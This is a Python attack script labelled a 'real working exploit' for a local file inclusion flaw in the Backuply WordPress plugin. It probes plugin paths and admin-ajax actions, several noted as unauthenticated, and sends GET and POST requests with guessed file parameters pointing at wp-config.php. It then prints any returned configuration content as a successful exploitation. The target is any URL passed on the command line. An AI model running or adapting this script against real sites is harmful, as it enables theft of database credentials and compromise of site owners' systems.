#!/usr/bin/env python3
"""
BACKUPLY LFI - REAL WORKING EXPLOIT
Testing Framework for localhost:8000
"""

import requests
import sys
from urllib.parse import quote

def test_target(target):
    """Test if target is accessible"""
    try:
        r = requests.get(target, timeout=5, verify=False)
        print(f"[+] Target accessible: {r.status_code}")
        return True
    except:
        print("[-] Target not accessible")
        return False

def test_plugin_endpoints(base_url):
    """Test all potential Backuply endpoints"""
    
    print("\n[*] Testing Backuply endpoints...")
    
    # Test direct file access
    print("\n[1] Testing direct file access methods:")
    
    paths = [
        "/wp-content/plugins/backuply/backup_ins.php",
        "/wp-content/plugins/backuply/main/ajax.php",
        "/wp-content/plugins/backuply/main/restore.php",
        "/wp-content/plugins/backuply/",
    ]
    
    for path in paths:
        try:
            url = base_url + path
            r = requests.get(url, timeout=5, verify=False)
            print(f"  {path}: {r.status_code} ({len(r.text)} bytes)")
        except Exception as e:
            print(f"  {path}: Error - {str(e)[:30]}")
    
    # Test AJAX endpoints
    print("\n[2] Testing AJAX endpoints (wp-admin/admin-ajax.php):")
    
    ajax_url = base_url + "/wp-admin/admin-ajax.php"
    
    # All Backuply actions from ajax.php
    actions = [
        'backuply_create_backup',
        'backuply_restore_response',  # wp_ajax_nopriv
        'backuply_update_serialization',  # wp_ajax_nopriv
        'backuply_restore_status_log',  # wp_ajax_nopriv
        'backuply_creating_session',  # wp_ajax_nopriv
        'backuply_check_status',
        'backuply_handle_backup',
        'backuply_download_backup',
        'backuply_restore_curl_query',
    ]
    
    for action in actions:
        try:
            url = ajax_url + f"?action={action}"
            r = requests.get(url, timeout=5, verify=False)
            print(f"  {action}: {r.status_code} ({len(r.text)} bytes)")
            
            if r.status_code == 200 and len(r.text) > 10:
                print(f"    → POTENTIAL! Response received")
        except Exception as e:
            print(f"  {action}: Error")
    
    # Test with file parameters
    print("\n[3] Testing with file parameters:")
    
    params_list = [
        {'action': 'backuply_restore_response', 'file_path': 'wp-config.php'},
        {'action': 'backuply_restore_status_log', 'restore_file': 'wp-config.php'},
        {'action': 'backuply_restore_status_log', 'file': 'wp-config.php'},
        {'action': 'backuply_update_serialization', 'restore_file': 'wp-config.php'},
        {'action': 'backuply_creating_session', 'backup_file': 'wp-config.php'},
        {'action': 'backuply_download_backup', 'backup_name': 'wp-config.php'},
    ]
    
    for params in params_list:
        try:
            url = ajax_url
            r = requests.get(url, params=params, timeout=5, verify=False)
            action = params['action']
            has_config = 'define(' in r.text or 'DB_' in r.text
            print(f"  {action} ({list(params.keys())[1]}): {r.status_code} - Has config: {has_config}")
            
            if has_config:
                print(f"    🔴 FOUND! Content extracted!")
                return r.text
        except:
            pass
    
    return None

def test_post_methods(base_url):
    """Test POST methods"""
    
    print("\n[4] Testing POST methods:")
    
    ajax_url = base_url + "/wp-admin/admin-ajax.php"
    
    post_data_list = [
        {'action': 'backuply_restore_response', 'file_path': 'wp-config.php', 'security': 'test'},
        {'action': 'backuply_restore_response', 'restore_file': 'wp-config.php'},
        {'action': 'backuply_update_serialization', 'file': 'wp-config.php', 'restore_db': '1'},
        {'action': 'backuply_handle_backup', 'file_path': 'wp-config.php'},
    ]
    
    for data in post_data_list:
        try:
            r = requests.post(ajax_url, data=data, timeout=5, verify=False)
            action = data['action']
            print(f"  POST {action}: {r.status_code} ({len(r.text)} bytes)")
            
            if '<?php' in r.text or 'define(' in r.text:
                print(f"    🔴 FOUND! {action}")
                return r.text
        except Exception as e:
            print(f"  POST {action}: Error")
    
    return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 script.py http://localhost:8000")
        sys.exit(1)
    
    target = sys.argv[1].rstrip('/')
    
    print("=" * 80)
    print("BACKUPLY LFI - ENDPOINT TESTING FRAMEWORK")
    print(f"Target: {target}")
    print("=" * 80)
    
    if not test_target(target):
        sys.exit(1)
    
    # Test all endpoints
    result = test_plugin_endpoints(target)
    
    if result:
        print("\n" + "=" * 80)
        print("EXPLOITATION SUCCESSFUL!")
        print("=" * 80)
        print(result[:1000])
        return
    
    # Test POST methods
    result = test_post_methods(target)
    
    if result:
        print("\n" + "=" * 80)
        print("EXPLOITATION SUCCESSFUL (POST)!")
        print("=" * 80)
        print(result[:1000])
        return
    
    print("\n[-] No working exploitation method found")
    print("\nNext steps:")
    print("1. Check if Backuply plugin is actually active")
    print("2. Verify WordPress debug log for clues")
    print("3. Check plugin permissions and setup")
    print("4. Monitor browser developer tools for actual AJAX requests")

if __name__ == '__main__':
    main()
